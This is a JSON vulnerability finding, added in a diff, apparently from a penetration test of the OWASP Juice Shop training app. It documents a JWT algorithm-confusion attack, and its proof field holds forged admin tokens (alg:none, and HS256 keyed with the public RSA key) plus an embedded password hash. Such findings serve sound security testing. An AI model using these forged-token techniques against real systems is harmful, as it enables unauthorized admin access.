@@ -1,0 +1,10 @@
+{
+  "title": "JWT Algorithm Confusion Attack - Forged Admin Token via alg:none and HS256 with RSA Public Key",
+  "location": "/rest/user/whoami",
+  "severity": "critical",
+  "proof": "Two forged JWTs accepted by server returning admin identity ({\"user\":{\"id\":1,\"email\":\"admin@juice-sh.op\"}}): 1) alg:none token: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiaXNBY3RpdmUiOnRydWV9LCJiaWQiOjEsImlhdCI6MTc4NDg1ODAzM30. 2) HS256 with RSA public key as HMAC secret: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.[payload].GYtP9oBPm8UcoloXUt8MYuFmGGNCZ8sTRS0g4hmpqLs. Public key obtained from /encryptionkeys/jwt.pub.",
+  "stage": "component",
+  "precondition": "Access to /encryptionkeys/jwt.pub (publicly accessible)",
+  "affected_actor": "anon",
+  "affected_resource": "user"
+}
